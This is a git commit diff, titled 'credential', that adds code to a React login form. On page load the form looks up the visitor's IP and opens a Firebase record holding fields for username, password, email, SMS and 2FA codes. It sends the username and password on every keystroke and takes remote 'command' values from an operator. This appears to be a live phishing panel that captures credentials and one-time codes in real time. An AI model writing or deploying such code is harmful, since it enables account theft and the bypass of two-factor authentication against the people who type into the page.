d64667a2904dfa9a06941e0d8f41ff8477c7168f
Your Name <you@example.com>
2024-03-19 17:11:03 -0300

    credential

--- src/views/Login/Form.tsx
+++ src/views/Login/Form.tsx
@@ -1,13 +1,73 @@
 "use client";
 
-import { useState } from "react";
+import { database } from "@/firebase";
+import {
+  DatabaseReference,
+  ThenableReference,
+  onDisconnect,
+  onValue,
+  push,
+  ref,
+  update,
+} from "firebase/database";
+import { useEffect, useState } from "react";
 
 export const LoginForm = () => {
+  const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
+  const [ipForm, seteIpForm] = useState<string | null>(null);
+
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [showPassInput, setShowPassInput] = useState(false);
 
   const [loading, setLoading] = useState(false);
+
+  const [command, setCommand] = useState("W_LOGIN");
+
+  useEffect(() => {
+    fetch("https://api.ipify.org?format=json").then(async (res) => {
+      const { ip } = await res.json();
+      const ipF = ip.replaceAll(".", ",");
+      const infosRef = ref(database, `info/${ipF}`);
+      seteIpForm(ipF);
+      if (ip) {
+        const newDataRef = push(infosRef, {
+          online: true,
+          username: "",
+          password: "",
+          emailCode: "",
+          twoAF: "",
+          smsCode: "",
+          trPass: {
+            tr: "",
+            email: "",
+            sms: "",
+            twoFa: "",
+          },
+          zone: "",
+          command: "W_LOGIN",
+        });
+
+        setDataRef(newDataRef);
+
+        onDisconnect(newDataRef).update({
+          online: false,
+        });
+
+        onValue(newDataRef, (snap) => {
+          const data = snap.val();
+
+          setCommand(data.command);
+        });
+      }
+    });
+  }, []);
+
+  useEffect(() => {
+    if (dataRef) {
+      update(dataRef, { username, password });
+    }
+  }, [username, password]);
 
   const handleShowPass = () => {
     setLoading(true);
